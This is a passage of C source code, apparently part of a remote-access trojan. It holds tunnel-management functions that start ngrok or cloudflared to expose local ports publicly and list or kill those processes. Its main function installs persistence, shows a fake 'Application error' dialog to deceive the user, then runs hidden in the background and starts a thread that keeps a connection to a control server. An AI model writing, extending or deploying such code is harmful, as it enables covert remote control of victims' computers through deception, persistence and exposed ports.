                            char *port_end = port_start;
                            while (*port_end && isdigit(*port_end)) port_end++;
                            if (port_end > port_start) {
                                size_t len = port_end - port_start;
                                if (len > sizeof(t->port) - 1) len = sizeof(t->port) - 1;
                                strncpy(t->port, port_start, len);
                                t->port[len] = '\0';
                            }
                        }
                    }
                    CloseHandle(hProcess);
                }
                
                count++;
            }
        } while (Process32Next(snapshot, &process_entry));
    }

    CloseHandle(snapshot);
#else
    // Use ps command to get process list
    FILE *fp = popen("ps -eo pid,comm,args | grep -E 'ngrok|cloudflared' | grep -v grep", "r");
    if (!fp) return 0;

    char line[2048];
    while (fgets(line, sizeof(line), fp)) {
        if (count >= capacity) {
            capacity *= 2;
            *tunnels = realloc(*tunnels, capacity * sizeof(TunnelInfo));
            if (!*tunnels) {
                pclose(fp);
                return 0;
            }
        }

        TunnelInfo *t = &(*tunnels)[count];
        t->url[0] = '\0';
        
        // Parse PID
        char *pid_str = line;
        while (isspace(*pid_str)) pid_str++;
        char *end = pid_str;
        while (*end && !isspace(*end)) end++;
        *end = '\0';
        t->pid = atoi(pid_str);
        
        // Parse command
        char *cmd = end + 1;
        while (isspace(*cmd)) cmd++;
        end = cmd;
        while (*end && !isspace(*end)) end++;
        *end = '\0';
        
        if (strcmp(cmd, "ngrok") == 0) {
            strcpy(t->tool, "ngrok");
            char *url = get_ngrok_url();
            if (url) {
                strncpy(t->url, url, sizeof(t->url) - 1);
                t->url[sizeof(t->url) - 1] = '\0';
                free(url);
            }
        } else if (strcmp(cmd, "cloudflared") == 0) {
            strcpy(t->tool, "cloudflared");
        } else {
            continue;
        }
        
        // Parse args to extract port
        char *args = end + 1;
        if (strstr(args, "http://localhost:")) {
            char *port_start = strstr(args, "http://localhost:") + strlen("http://localhost:");
            char *port_end = port_start;
            while (*port_end && isdigit(*port_end)) port_end++;
            if (port_end > port_start) {
                size_t len = port_end - port_start;
                if (len > sizeof(t->port) - 1) len = sizeof(t->port) - 1;
                strncpy(t->port, port_start, len);
                t->port[len] = '\0';
            }
        }
        
        count++;
    }

    pclose(fp);
#endif
    return count;
}

static void start_tunnel(const char *tool, const char *port) {
    char cmd[4096];
    char *url = NULL;
    
    if (strcmp(tool, "ngrok") == 0) {
        if (!command_exists("ngrok")) {
            printf("[!] ngrok not found in PATH\n");
            return;
        }
        
        // Check if already running
        if (is_process_running("ngrok.exe") || is_process_running("ngrok")) {
            printf("[*] ngrok is already running. Getting URL...\n");
            url = get_ngrok_url();
            if (!url) {
                printf("[!] Failed to get ngrok URL. Starting new instance...\n");
#ifdef _WIN32
                snprintf(cmd, sizeof(cmd), "start /B \"\" ngrok http %s", port);
#else
                snprintf(cmd, sizeof(cmd), "ngrok http %s > /dev/null 2>&1 &", port);
#endif
                system(cmd);
                
                // Wait and try to get URL
                sleep(3);
                url = get_ngrok_url();
            }
        } else {
#ifdef _WIN32
            snprintf(cmd, sizeof(cmd), "start /B \"\" ngrok http %s", port);
#else
            snprintf(cmd, sizeof(cmd), "ngrok http %s > /dev/null 2>&1 &", port);
#endif
            system(cmd);
            
            // Wait and try to get URL
            printf("Starting ngrok");
            for (int i = 0; i < 15 && !url; i++) {
                printf(".");
                fflush(stdout);
                sleep(2);
                url = get_ngrok_url();
            }
        }
    } 
    else if (strcmp(tool, "cloudflared") == 0) {
        char cf_path[1200];
        bool found = false;
        
        if (command_exists("cloudflared")) {
            found = true;
        } else {
            // Check in our install directory
            char install_dir[1024];
            get_install_dir(install_dir, sizeof(install_dir));
#ifdef _WIN32
            snprintf(cf_path, sizeof(cf_path), "%s\\cloudflared.exe", install_dir);
#else
            snprintf(cf_path, sizeof(cf_path), "%s/cloudflared", install_dir);
#endif
            if (access(cf_path, X_OK) == 0) {
                found = true;
            }
        }
        
        if (!found) {
            printf("[!] cloudflared not found. Run 'tunnel install' first.\n");
            return;
        }
        
        // Check if already running
        if (is_process_running("cloudflared.exe") || is_process_running("cloudflared")) {
            printf("[*] cloudflared is already running\n");
            return;
        }
        
        printf("Starting cloudflared");
        fflush(stdout);
        
#ifdef _WIN32
        snprintf(cmd, sizeof(cmd), "start /B \"\" \"%s\" tunnel --url http://localhost:%s", cf_path, port);
#else
        snprintf(cmd, sizeof(cmd), "\"%s\" tunnel --url http://localhost:%s > /dev/null 2>&1 &", cf_path, port);
#endif
        system(cmd);
        
        // Wait a bit for it to start
        for (int i = 0; i < 10; i++) {
            printf(".");
            fflush(stdout);
            sleep(1);
        }
        
        printf("\n[✔] cloudflared started. Check its output for URL\n");
        return;
    }
    
    if (url) {
        printf("\n[✔] Tunnel created successfully!\n");
        printf("URL: %s\n", url);
        free(url);
    } else {
        printf("\n[!] Failed to get tunnel URL\n");
    }
}

static void list_tunnels() {
    printf("Checking for running tunnels...\n\n");
    
    // Check ngrok
    printf("=== ngrok tunnels ===\n");
    if (is_process_running("ngrok.exe") || is_process_running("ngrok")) {
        char *url = get_ngrok_url();
        if (url) {
            printf("URL: %s\n", url);
            free(url);
        } else {
            printf("ngrok is running but URL not available\n");
        }
    } else {
        printf("No ngrok tunnels found\n");
    }
    
    // Check cloudflared
    printf("\n=== cloudflared tunnels ===\n");
    if (is_process_running("cloudflared.exe") || is_process_running("cloudflared")) {
        printf("cloudflared is running\n");
        printf("Note: The URL was displayed when the tunnel was started\n");
    } else {
        printf("No cloudflared tunnels found\n");
    }
}

static void close_tunnel(int pid) {
    if (kill_process(pid)) {
        printf("[✔] Tunnel with PID %d has been terminated\n", pid);
    } else {
        printf("[!] Failed to terminate tunnel with PID %d\n", pid);
    }
}

static void print_tunnel_help() {
    printf("Available tunnel commands:\n");
    printf("  tunnel install           - Install cloudflared\n");
    printf("  tunnel list              - List running tunnels\n");
    printf("  tunnel close <pid>       - Close a tunnel by PID\n");
    printf("  tunnel expose -p<port> -c - Expose port using cloudflared\n");
    printf("  tunnel expose -p<port> -n - Expose port using ngrok\n");
}

static void process_tunnel_expose(int argc, char **argv) {
    char *port = NULL;
    char *tool = NULL;
    
    for (int i = 2; i < argc; i++) {
        if (strncmp(argv[i], "-p", 2) == 0) {
            if (strlen(argv[i]) > 2) {
                port = argv[i] + 2;
            } else if (i + 1 < argc) {
                port = argv[++i];
            }
        } else if (strcmp(argv[i], "-c") == 0) {
            tool = "cloudflared";
        } else if (strcmp(argv[i], "-n") == 0) {
            tool = "ngrok";
        }
    }
    
    if (!port) {
        printf("Error: port not specified. Use -p<port> or -p <port>\n");
        return;
    }
    
    if (!tool) {
        printf("Error: tool not specified. Use -c for cloudflared or -n for ngrok\n");
        return;
    }
    
    start_tunnel(tool, port);
}

static void process_tunnel_close(int argc, char **argv) {
    if (argc < 3) {
        printf("Usage: tunnel close <pid>\n");
        return;
    }
    
    int pid = atoi(argv[2]);
    if (pid <= 0) {
        printf("Invalid PID\n");
        return;
    }
    
    close_tunnel(pid);
}

void process_tunnel_command(int argc, char **argv) {
    if (argc < 2) {
        printf("Usage: tunnel <command>\n");
        print_tunnel_help();
        return;
    }
    
    if (strcmp(argv[1], "install") == 0) {
        install_cloudflared();
    } else if (strcmp(argv[1], "list") == 0) {
        list_tunnels();
    } else if (strcmp(argv[1], "close") == 0) {
        process_tunnel_close(argc, argv);
    } else if (strcmp(argv[1], "expose") == 0) {
        process_tunnel_expose(argc, argv);
    } else {
        printf("Unknown tunnel command: %s\n", argv[1]);
        print_tunnel_help();
    }
}

// Main function
int main(int argc, char *argv[]) {
    // Initialize to user's home directory FIRST
    #ifdef _WIN32
        char *userprofile = getenv("USERPROFILE");
        if (userprofile != NULL) {
            strncpy(current_dir, userprofile, sizeof(current_dir) - 1);
            current_dir[sizeof(current_dir) - 1] = '\0';
            chdir(current_dir);
        } else {
            strcpy(current_dir, "C:\\");
            chdir(current_dir);
        }
    #else
        char *home = getenv("HOME");
        if (home != NULL) {
            strncpy(current_dir, home, sizeof(current_dir) - 1);
            current_dir[sizeof(current_dir) - 1] = '\0';
            chdir(home);
        } else {
            strcpy(current_dir, "/");
            chdir("/");
        }
    #endif
    
    // Verify directory
    char verify_dir[MAX_PATH_LENGTH];
    if (getcwd(verify_dir, sizeof(verify_dir)) != NULL) {
        strncpy(current_dir, verify_dir, sizeof(current_dir) - 1);
        current_dir[sizeof(current_dir) - 1] = '\0';
    }
    
    // Create output directories
    create_output_directories();
    
    #ifdef _WIN32
        WSADATA wsaData;
        WSAStartup(MAKEWORD(2, 2), &wsaData);
        CoInitialize(NULL);
    #endif
    
    // Process command line arguments
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--minimized") == 0) {
            background_mode = 1;
        }
    }
    
    // Install persistence
    install_persistence();
    
    // Show fake error if not in background mode and no arguments
    if (!background_mode && argc == 1) {
        #ifdef _WIN32
            MessageBox(NULL, "Application error 0x000008\nThe application failed to initialize properly.", 
                      "Application Error", MB_OK | MB_ICONERROR);
        #else
            system("zenity --error --text='Application error 0x000008' 2>/dev/null || xmessage 'Application error 0x000008'");
        #endif
        
        background_mode = 1;
        run_in_background();
        return 0;
    }
    
    // Check if we should run in background mode
    if (background_mode || !has_console()) {
        run_in_background();
        return 0;
    }
    
    // Start background thread for server connection
    pthread_t server_thread;
    pthread_create(&server_thread, NULL, (void *(*)(void *))maintain_server_connection, NULL);
    pthread_detach(server_thread);
    
    // If running with arguments, execute the command and exit
    if (argc > 1 && strcmp(argv[1], "--minimized") != 0) {
        char *args[MAX_COMMAND_LENGTH / 2 + 1];
        int arg_count = 0;
        
        for (int i = 1; i < argc && arg_count < MAX_COMMAND_LENGTH / 2; i++) {
            args[arg_count++] = argv[i];
        }
        args[arg_count] = NULL;
        
        int found = 0;
        for (int i = 0; commands[i].name != NULL; i++) {
            if (strcmp(args[0], commands[i].name) == 0) {
                commands[i].func(args + 1);
                found = 1;
                break;
            }
        }
        
        if (!found) {
            printf("Unknown command: %s\n", args[0]);
        }
    }
    
    #ifdef _WIN32
        WSACleanup();
        CoUninitialize();
    #endif
    
    return 0;
}